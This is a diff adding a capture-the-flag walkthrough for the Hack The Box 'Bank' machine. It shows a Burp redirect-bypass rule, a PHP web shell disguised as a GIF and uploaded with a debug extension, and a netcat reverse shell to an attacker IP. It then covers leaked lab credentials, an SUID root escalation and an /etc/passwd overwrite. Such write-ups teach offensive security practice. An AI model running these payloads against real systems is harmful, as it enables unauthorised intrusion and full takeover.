@@ -73,6 +73,199 @@ bank.htb.               604800  IN      SOA     bank.htb. chris.bank.htb. 5 6048
 ;; WHEN: Wed Nov 03 12:23:45 CET 2021
 ;; XFR size: 6 records (messages 1, bytes 171)
 ```
+Here we can see that we discovered few subdomains, so just add them to the /etc/hosts file and hit the webserver.
 ## User
+### Method 1 - Unintended
+Poking around with burp we can see that when hitting /index.php we receive a 302 from the server, but below we can see some code which is odd.
+```
+HTTP/1.1 302 Found
+Date: Thu, 04 Nov 2021 08:55:57 GMT
+Server: Apache/2.4.7 (Ubuntu)
+X-Powered-By: PHP/5.5.9-1ubuntu4.21
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+location: login.php
+Content-Length: 7322
+Connection: close
+Content-Type: text/html
 
+<div class="col-md-10">
+
+    <div class="row">
+        <div class="col-lg-3 col-md-6">
+            <div class="panel panel-primary">
+                <div class="panel-heading">
+                    <div class="row">
+                        <div class="col-xs-3">
+                            <i class="fa fa-usd fa-5x"></i>
+                        </div>
+                        [ ... SNIP ... ]
+```
+So, if we manage to change the response code from 302 to 200, we will be able to render the page.
+To test this we can use burp and go under ```Proxy > Options > Intercept Server Responses > click on "Intercept Requests based
+on the following rules"``` And now we can request /index.php, edit the the response code from 302 to 200 and now we will be able to render the page.
+Once we have tested that this works, we can create a match and replace rule so that burp will do this work automatically.
+In order to do this, we can navigate to ```Proxy > Options > Match and Replace > click on "Add"``` and create the rule as follow:
+```
+Type: response header
+Match: 30[12] Found
+Replace: 200 Ok
+Regex match: true
+```
+Now also with intercept off we can see all the webserver pages without authenticating.
+If we request /support.php, we can see that there is an upload file function.
+This upload function takes only images, so we can try to cheat the checks and upload a payload using the following file.
+```
+[root@kali Bank ]$ cat shell.gif.php          
+GIF8
+<?php echo system($_REQUEST['cmd']); ?>
+[root@kali Bank ]$ file shell.gif.php
+shell.gif.php: GIF image data 28735 x 28776
+```
+when we try to upload this we get an error like "file is not an image", but examining the code, we can se the below comment
+```
+<!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->
+```
+so, now we can creft the following request using .htb as file extension and upload our payload
+```
+POST /support.php HTTP/1.1
+Host: bank.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------30419209283130348382134040843
+Content-Length: 624
+Origin: http://bank.htb
+Connection: close
+Referer: http://bank.htb/support.php
+Cookie: HTBBankAuth=abhglbjitc02c6g3d1ur2pkpu7
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+-----------------------------30419209283130348382134040843
+Content-Disposition: form-data; name="title"
+
+asd
+-----------------------------30419209283130348382134040843
+Content-Disposition: form-data; name="message"
+
+asdasd
+-----------------------------30419209283130348382134040843
+Content-Disposition: form-data; name="fileToUpload"; filename="shell.htb"
+Content-Type: application/x-php
+
+GIF8
+<?php echo system($_REQUEST['cmd']); ?>
+
+-----------------------------30419209283130348382134040843
+Content-Disposition: form-data; name="submitadd"
+
+
+-----------------------------30419209283130348382134040843--
+```
+Once Uploaded the payload we can creft the following request and get a reverse shell:
+```
+POST /uploads/shell.htb HTTP/1.1
+Host: bank.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: HTBBankAuth=abhglbjitc02c6g3d1ur2pkpu7
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+
+cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.18+4444+>/tmp/f
+```
+Got reverse shell.
+```
+root@kali:~/Documents/HTB/Boxes/Bank# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.10.29] 58878
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+### Method 2 - Credential leakage
+Running gobuster against bank.htb, we can see the following results:
+```
+/uploads              (Status: 301) [Size: 305] [--> http://bank.htb/uploads/]
+/assets               (Status: 301) [Size: 304] [--> http://bank.htb/assets/]
+/inc                  (Status: 301) [Size: 301] [--> http://bank.htb/inc/]
+/server-status        (Status: 403) [Size: 288]
+/balance-transfer     (Status: 301) [Size: 314] [--> http://bank.htb/balance-transfer/]
+```
+if we open /balance-transfer directory, we can see some reports with encrypted informations.
+now we can download this files to examine them and see if they contains some valuable information.
+If we run a word count and sort on all the balance transfer files, we can see that one file contains lot less characters.
+```
+581 941e55bed0cb8052e7015e7133a5b9c7.acc
+581 09ed7588d1cd47ffca297cc7dac22c52.acc
+257 68576f20e9732f1b2edc4df5b8533230.acc
+```
+If we do open this file, we can see that the encryption failed and we have credential in cleartext
+```
+[root@kali balance-transfer ]$ cat 68576f20e9732f1b2edc4df5b8533230.acc                                    
+--ERR ENCRYPT FAILED
++=================+
+| HTB Bank Report |
++=================+
+
+===UserAccount===
+Full Name: Christos Christopoulos
+Email: chris@bank.htb
+Password: !##HTBB4nkP4ssw0rd!##
+CreditCards: 5
+Transactions: 39
+Balance: 8842803 .
+===UserAccount===
+```
+this credentials can be used to access bank.htb.
+Now we can access the support page and, as we know, this page can be used to upload a shell and get code execution.
 ## Root
+### Method 1 - SUID executable
+Once we have the initial shell, we can run linpeas and see if there is any priversc vector.
+As we can see there is an executable with SUID bit set:
+```
+-rwsr-xr-x 1 root root 110K Jun 14  2017 /var/htb/bin/emergency (Unknown SUID binary)
+```
+If we try to run this we instantly have a shell as root
+```
+www-data@bank:/var/www/bank/uploads$ /var/htb/bin/emergency
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+# cat /root/root.txt
+138a92b65e22405ef03b60b0bb3ab784
+```
+
+### Method 2 - World writable /etc/passwd
+Once we have the initial shell, we can run linpeas and see if there is any priversc vector.
+As we can see linpeas notice us that /etc/passwd file is writable by anyone.
+```
+ ╔══════════╣ Permissions in init, init.d, systemd, and                                    
+═╣ Writable passwd file? ................ /etc/passwd is writable
+```
+so now we can create a new password, edit the file and login with the created password.
+To create the password we can use openssl:
+```
+www-data@bank:/var/www/bank/uploads$ openssl passwd lucab0dd
+XQJM6fcLUQoak
+```
+Now we can place the generated password inside /etc/passwd
+```
+root:XQJM6fcLUQoak:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+```
+now we can login as root with password lucab0dd:
+```
+www-data@bank:/var/www/bank/uploads$ su root
+Password:
+root@bank:/var/www/bank/uploads#
+```
